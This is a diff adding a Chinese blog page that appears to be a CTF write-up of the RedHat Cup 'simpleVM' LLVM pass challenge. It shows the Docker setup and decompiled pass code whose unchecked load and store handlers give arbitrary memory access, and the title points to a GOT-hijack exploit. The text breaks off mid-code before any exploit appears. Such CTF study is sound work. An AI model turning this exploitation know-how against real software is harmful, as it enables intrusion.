@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="红帽杯 simpleVM 复现 注意：做 LLVM pass 的 pwn 题最好使用 IDA7.7 及其以上的版本 12345678910111213Hack LLVM!Docker Guidance:FROM ubuntu:18.04  RUN sed -i &quot;s&#x2F;http:\&#x2F;\&#x2F;archive.ubuntu.com&#x2F;http:\&#x2F;\&#x2F;mirrors.tuna.tsinghua.ed">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LLVM+Got劫持">
+<meta property="og:url" content="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="红帽杯 simpleVM 复现 注意：做 LLVM pass 的 pwn 题最好使用 IDA7.7 及其以上的版本 12345678910111213Hack LLVM!Docker Guidance:FROM ubuntu:18.04  RUN sed -i &quot;s&#x2F;http:\&#x2F;\&#x2F;archive.ubuntu.com&#x2F;http:\&#x2F;\&#x2F;mirrors.tuna.tsinghua.ed">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917067225.png">
+<meta property="og:image" content="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917316159.png">
+<meta property="og:image" content="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917365912.png">
+<meta property="article:published_time" content="2022-06-04T15:09:54.000Z">
+<meta property="article:modified_time" content="2022-06-04T15:13:04.737Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="LLVM pass pwn">
+<meta property="article:tag" content="cpp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917067225.png">
+
+<link rel="canonical" href="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>LLVM+Got劫持 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LLVM+Got劫持
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-06-04 23:09:54 / Modified: 23:13:04" itemprop="dateCreated datePublished" datetime="2022-06-04T23:09:54+08:00">2022-06-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>红帽杯 simpleVM 复现</strong></p>
+<p>注意：做 LLVM pass 的 pwn 题最好使用 IDA7.7 及其以上的版本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hack LLVM!</span><br><span class="line"></span><br><span class="line">Docker Guidance:</span><br><span class="line"></span><br><span class="line">FROM ubuntu:<span class="number">18.04</span></span><br><span class="line">  </span><br><span class="line">RUN sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.<span class="built_in">list</span> &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd libseccomp-dev libseccomp2 seccomp clang<span class="number">-8</span> opt llvm<span class="number">-8</span> python</span><br><span class="line"></span><br><span class="line">once your <span class="built_in">exp</span>.bc(bitcode file) is uploaded</span><br><span class="line"></span><br><span class="line">Sever will execute `opt<span class="number">-8</span> -load ./VMPass.so -VMPass ./<span class="built_in">exp</span>.bc`</span><br></pre></td></tr></table></figure>
+<p>按照程序要求，预先配置好环境</p>
+<p>知晓“在代码中注册的名字”时，就可以通过如下方法寻找 runOnFunction：</p>
+<ul>
+<li>在 IDA 中搜索题目给定的“在代码中注册的名字”，找到对应的函数</li>
+</ul>
+<p><img src="/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917067225.png" alt="1653917067225"> </p>
+<ul>
+<li>在这个函数及其子函数中寻找 off-xxxx 就可能找到虚表（尽量找那些未命名的函数）</li>
+</ul>
+<p><img src="/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917316159.png" alt="1653917316159"> </p>
+<ul>
+<li>虚表的最后一个条目就是 runOnFunction</li>
+</ul>
+<p><img src="/2022/06/04/LLVM+Got%E5%8A%AB%E6%8C%81/1653917365912.png" alt="1653917365912"> </p>
+<p>如果函数名是 <code>o0o0o0o0</code>，则调用函数 <code>sub_6AC0</code> 进行进一步处理：（本人看不懂Cpp）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *BasicBlock; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    BasicBlock = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, BasicBlock);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>大概的意思就是：遍历IR中 <code>o0o0o0o0</code> 函数中的 <code>BasicBlock(基本代码块)</code>，然后继续调用 <code>sub_6B80</code> 函数进行处理</li>
+<li>该函数会遍历 <code>BasicBlock(基本代码块)</code> 中的指令，然后匹配到对应指令后进行处理</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6B80</span><span class="params">(__int64 a1, llvm::BasicBlock *BasicBlock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::Value *CalledFunction; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> **v4; <span class="comment">// rax</span></span><br><span class="line">  llvm::ConstantInt *key_min2; <span class="comment">// [rsp+18h] [rbp-1B8h]</span></span><br><span class="line">  __int64 ArgOp_min2; <span class="comment">// [rsp+20h] [rbp-1B0h]</span></span><br><span class="line">  __int64 op_min; <span class="comment">// [rsp+28h] [rbp-1A8h]</span></span><br><span class="line">  llvm::ConstantInt *key_min; <span class="comment">// [rsp+30h] [rbp-1A0h]</span></span><br><span class="line">  _QWORD *reg_min; <span class="comment">// [rsp+38h] [rbp-198h]</span></span><br><span class="line">  __int64 ArgOp_min; <span class="comment">// [rsp+40h] [rbp-190h]</span></span><br><span class="line">  llvm::ConstantInt *key_add2; <span class="comment">// [rsp+50h] [rbp-180h]</span></span><br><span class="line">  __int64 ArgOp_add2; <span class="comment">// [rsp+58h] [rbp-178h]</span></span><br><span class="line">  __int64 op_add; <span class="comment">// [rsp+60h] [rbp-170h]</span></span><br><span class="line">  llvm::ConstantInt *key_add; <span class="comment">// [rsp+68h] [rbp-168h]</span></span><br><span class="line">  _QWORD *reg_add; <span class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 ArgOp_add; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 op_load; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *key_load; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">void</span> *reg_load; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 ArgOp_load; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 op_store; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *key_store; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="keyword">void</span> *reg_store; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 ArgOp_store; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 op_push; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *key_push; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *reg_push; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 ArgOp_push; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 op_pop; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *key_pop; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *reg_pop; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOp_pop; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> *name; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::begin(BasicBlock);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::end(BasicBlock);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">        *(_QWORD *)name = *Name;</span><br><span class="line">        *((_QWORD *)name + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)name + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)name + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_pop = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_pop = <span class="number">0LL</span>;</span><br><span class="line">            key_pop = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_pop);</span><br><span class="line">            <span class="keyword">if</span> ( key_pop )</span><br><span class="line">            &#123;</span><br><span class="line">              op_pop = llvm::ConstantInt::getZExtValue(key_pop);</span><br><span class="line">              <span class="keyword">if</span> ( op_pop == <span class="number">1</span> )</span><br><span class="line">                reg_pop = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_pop == <span class="number">2</span> )</span><br><span class="line">                reg_pop = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_pop )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = stack_s;</span><br><span class="line">              *reg_pop = *(_QWORD *)*stack_s;</span><br><span class="line">              *v3 = (<span class="keyword">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_push = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_push = <span class="number">0LL</span>;</span><br><span class="line">            key_push = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_push);</span><br><span class="line">            <span class="keyword">if</span> ( key_push )</span><br><span class="line">            &#123;</span><br><span class="line">              op_push = llvm::ConstantInt::getZExtValue(key_push);</span><br><span class="line">              <span class="keyword">if</span> ( op_push == <span class="number">1</span> )</span><br><span class="line">                reg_push = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_push == <span class="number">2</span> )</span><br><span class="line">                reg_push = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_push )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = stack_s;</span><br><span class="line">              *stack_s = (<span class="keyword">char</span> *)*stack_s + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *reg_push;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_store = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_store = <span class="number">0LL</span>;</span><br><span class="line">            key_store = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_store);</span><br><span class="line">            <span class="keyword">if</span> ( key_store )</span><br><span class="line">            &#123;</span><br><span class="line">              op_store = llvm::ConstantInt::getZExtValue(key_store);</span><br><span class="line">              <span class="keyword">if</span> ( op_store == <span class="number">1</span> )</span><br><span class="line">                reg_store = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_store == <span class="number">2</span> )</span><br><span class="line">                reg_store = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_store == register1 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)register1 = *(_QWORD *)register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( reg_store == register2 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)register2 = *(_QWORD *)register1;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(name, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ArgOp_load = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            reg_load = <span class="number">0LL</span>;</span><br><span class="line">            key_load = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOp_load);</span><br><span class="line">            <span class="keyword">if</span> ( key_load )</span><br><span class="line">            &#123;</span><br><span class="line">              op_load = llvm::ConstantInt::getZExtValue(key_load);</span><br><span class="line">              <span class="keyword">if</span> ( op_load == <span class="number">1</span> )</span><br><span class="line">                reg_load = register1;</span><br><span class="line">              <span class="keyword">if</span> ( op_load == <span class="number">2</span> )</span><br><span class="line">                reg_load = register2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( reg_load == register1 )</span><br><span class="line">              *(_QWORD *)register2 = **(_QWORD **)register1;</span><br><span class="line">            <span class="keyword">if</span> ( reg_load == register2 